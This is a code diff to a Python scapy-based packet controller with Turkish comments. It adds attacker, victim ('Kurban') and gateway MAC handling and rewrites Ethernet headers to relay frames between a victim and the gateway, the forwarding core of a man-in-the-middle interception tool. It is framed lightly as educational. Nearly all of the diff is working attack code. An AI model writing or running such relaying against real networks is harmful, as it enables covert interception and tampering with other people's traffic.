@@ -132,6 +132,15 @@ class PacketFlowController:
         self._filter: Optional[str] = None  # BPF filtresi
         self._inspect_callback: Optional[Callable] = None
 
+        self.attacker_mac: Optional[str] = None
+        self.target_mac:   Optional[str] = None
+        self.gateway_mac:  Optional[str] = None
+        if SCAPY_AVAILABLE:
+            try:
+                self.attacker_mac = get_if_hwaddr(self.iface).lower()
+            except Exception:
+                self.attacker_mac = None
+
         # Dispatch tablosu (her paket için yeniden oluşturma yerine bir kez)
         self._dispatch = {
             FlowMode.FORWARD:  self._process_forward,
@@ -169,11 +178,23 @@ class PacketFlowController:
 
         Eğitim Notu:
             sendp() → Layer 2 (Ethernet frame) gönderimi.
-            send()  → Layer 3 (IP datagram) gönderimi.
-            Şeffaf tünelleme için Ethernet başlığını korumak istediğimizden
-            sendp() kullanırız.
+            Şeffaf yönlendirme için paketin hedef MAC adresini alıcıya göre
+            (Kurban → Gateway MAC, Gateway → Kurban MAC) güncelleriz.
         """
         try:
+            if pkt.haslayer(Ether):
+                src_mac = pkt[Ether].src.lower()
+                # Kurban ve gateway MAC'leri biliniyorsa hedef MAC'i yönlendir
+                if self.target_mac and self.gateway_mac:
+                    t_mac = self.target_mac.lower()
+                    gw_mac = self.gateway_mac.lower()
+                    if src_mac == t_mac:
+                        pkt[Ether].src = self.attacker_mac or src_mac
+                        pkt[Ether].dst = self.gateway_mac
+                    elif src_mac == gw_mac:
+                        pkt[Ether].src = self.attacker_mac or src_mac
+                        pkt[Ether].dst = self.target_mac
+
             sendp(pkt, iface=self.iface, verbose=False)
             return True
         except OSError:
@@ -288,6 +309,12 @@ class PacketFlowController:
         if self._stop_event.is_set():
             return
 
+        # Kendi gönderdiğimiz paketleri filtrele (paket fırtınası / döngü engeli)
+        if pkt.haslayer(Ether):
+            src_mac = pkt[Ether].src.lower()
+            if self.attacker_mac and src_mac == self.attacker_mac:
+                return
+
         handler_fn = self._dispatch.get(self.mode)
         if handler_fn:
             try:
@@ -302,7 +329,9 @@ class PacketFlowController:
         mode: FlowMode = FlowMode.FORWARD,
         bpf_filter: Optional[str] = None,
         throttle_kbps: float = 512.0,
-        inspect_callback: Optional[Callable] = None
+        inspect_callback: Optional[Callable] = None,
+        target_mac: Optional[str] = None,
+        gateway_mac: Optional[str] = None,
     ) -> bool:
         """
         Paket akış kontrolünü başlatır.
@@ -310,9 +339,10 @@ class PacketFlowController:
         Args:
             mode:             Başlangıç FlowMode.
             bpf_filter:       BPF (Berkeley Packet Filter) filtre ifadesi.
-                              Örn: "tcp", "udp port 53", "host 192.168.1.5"
             throttle_kbps:    THROTTLE modunda kbps sınırı.
             inspect_callback: INSPECT modunda ek işlem yapacak fonksiyon.
+            target_mac:       Kurban cihazın MAC adresi (şeffaf L2 yönlendirme için).
+            gateway_mac:      Ağ geçidi MAC adresi.
 
         Returns:
             bool: Başarılı ise True.
@@ -331,6 +361,8 @@ class PacketFlowController:
         self.throttle_kbps = throttle_kbps
         self._filter = bpf_filter
         self._inspect_callback = inspect_callback
+        self.target_mac = target_mac
+        self.gateway_mac = gateway_mac
         self.stats = FlowStats()    # İstatistikleri sıfırla
         self._stop_event.clear()
 
